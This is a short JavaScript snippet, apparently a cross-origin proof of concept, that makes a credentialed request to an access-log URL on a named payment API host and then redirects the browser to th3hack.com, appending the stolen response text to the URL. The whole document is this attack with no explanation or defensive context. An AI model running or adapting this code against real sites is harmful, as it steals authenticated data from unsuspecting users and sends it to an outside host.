var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://opsg-payapi-in.oppo.com/access.log',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//th3hack.com/log?key='+this.responseText; 
};
